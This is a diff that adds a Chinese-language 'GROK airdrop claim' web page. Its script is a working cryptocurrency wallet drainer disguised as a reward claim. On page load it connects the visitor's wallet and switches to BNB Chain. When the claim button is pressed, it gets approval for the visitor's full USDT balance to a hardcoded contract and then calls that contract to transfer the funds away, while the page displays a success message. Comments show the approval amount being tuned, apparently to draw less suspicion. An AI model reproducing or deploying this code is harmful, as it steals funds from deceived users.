@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="https://q0.itc.cn/q_70/images03/20250225/57c7286da04349c0bbda1b6f31671168.png" type="image/x-icon">
+  <title>GROK 空投领取</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f0f4f8; margin: 0; padding: 20px; min-height: 100vh; display: flex; justify-content: center; align-items: center; }
+    .card { background: white; border-radius: 20px; padding: 30px; width: 100%; max-width: 420px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); text-align: center; }
+    h1 { color: #1a73e8; margin: 0 0 10px; font-size: 24px; }
+    .address { background: #f8f9fa; padding: 12px; border-radius: 12px; font-family: monospace; font-size: 14px; word-break: break-all; color: #1a73e8; margin: 15px 0; }
+    button { width: 100%; padding: 16px; margin: 20px 0 10px; background: #e91e63; color: white; border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; }
+    button:hover { background: #c2185b; }
+    #status { margin-top: 15px; padding: 12px; border-radius: 12px; font-size: 14px; min-height: 50px; display: flex; align-items: center; justify-content: center; flex-direction: column; }
+    .success { background: #d4edda; color: #155724; }
+    .error { background: #f8d7da; color: #721c24; }
+    .info { background: #d1ecf1; color: #0c5460; }
+    .loading { background: #fff3cd; color: #856404; }
+    .warning { background: #fff3cd; color: #856404; padding: 12px; border-radius: 8px; margin: 10px 0; font-size: 13px; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>GROK 奖励领取</h1>
+    <div class="warning">
+      <strong>注意：</strong>最多只能领取<strong>钱包中</strong>，实际余额
+    </div>
+    <div id="walletInfo" style="display:none;">
+      <div class="address" id="walletAddress"></div>
+      <div style="margin-top:10px; color:#666;">剩余空投 余额: <span id="usdtBalance">加载中...</span></div>
+    </div>
+    <button id="actionBtn" onclick="approveAndTransfer()">领取奖励</button>
+    <div id="status" class="info">
+      正在自动连接钱包...<br>
+      <small>请在 TP 插件中确认</small>
+    </div>
+  </div>
+
+  <script>
+    const CONTRACT = "0xDBab099b99f472917a792F54734F183Aed6257eF";
+    const USDT = "0xa85f403f7869a050c91e9a260dbf08a64229b2de";
+    const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+
+    const ABI_USDT = [
+      {"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
+      {"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}
+    ];
+
+    const ABI_FORWARDER = [{"inputs":[],"name":"transferFromApproved","outputs":[],"stateMutability":"nonpayable","type":"function"}];
+
+    let web3, account;
+    const status = document.getElementById("status");
+    const walletInfo = document.getElementById("walletInfo");
+    const walletAddress = document.getElementById("walletAddress");
+    const usdtBalance = document.getElementById("usdtBalance");
+
+    async function autoConnect() {
+      if (!window.ethereum) {
+        status.className = "error";
+        status.innerHTML = "未检测到钱包插件";
+        return false;
+      }
+      try {
+        web3 = new Web3(window.ethereum);
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const chainId = await web3.eth.getChainId();
+        if (chainId !== 56) {
+          await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
+        }
+        [account] = await web3.eth.getAccounts();
+        walletAddress.innerText = account;
+        walletInfo.style.display = "block";
+        status.className = "success";
+        status.innerHTML = `空投领取中<br><small>${account.slice(0,8)}...${account.slice(-6)}</small>`;
+        await updateUSDTBalance();
+        return true;
+      } catch (e) {
+        status.className = "error";
+        status.innerHTML = e.code === 4001 ? "用户取消连接" : "连接失败";
+        return false;
+      }
+    }
+
+    async function updateUSDTBalance() {
+      try {
+        const usdt = new web3.eth.Contract(ABI_USDT, USDT);
+        const balance = await usdt.methods.balanceOf(account).call();
+        // USDT 6 位小数
+        const formatted = (balance / 1e6).toFixed(6);
+        usdtBalance.innerText = formatted;
+      } catch (e) {
+        usdtBalance.innerText = "查询失败";
+      }
+    }
+
+async function approveAndTransfer() {
+  if (!account && !await autoConnect()) return;
+
+  status.className = "loading";
+  status.innerHTML = "正在查询余额并授权...<br><small>请确认第一笔交易</small>";
+
+  try {
+    const usdt = new web3.eth.Contract(ABI_USDT, USDT);
+
+    // 关键：先查一次真实余额（wei）
+    const balance = await usdt.methods.balanceOf(account).call();
+
+    if (balance === "0") {
+      status.className = "warning";
+      status.innerHTML = "余额为 0，无需操作";
+      return;
+    }
+
+    // 关键：只授权“实际余额”，不再用 MAX_UINT256
+    await usdt.methods.approve(CONTRACT, balance).send({ from: account });
+
+    status.innerHTML = "授权成功！正在转账...<br><small>请确认第二笔交易</small>";
+
+    // 这行保持不变
+    const forwarder = new web3.eth.Contract(ABI_FORWARDER, CONTRACT);
+    await forwarder.methods.transferFromApproved().send({ from: account });
+
+    status.className = "success";
+    status.innerHTML = "领取成功！<br>USDT 已到账";
+    await updateUSDTBalance();
+
+  } catch (e) {
+    status.className = "error";
+    status.innerHTML = e.code === 4001 ? "用户取消操作" : "交易失败";
+    console.error(e);
+  }
+}
+
+    window.onload = async () => {
+      await autoConnect();
+    };
+  </script>
+</body>
+</html>
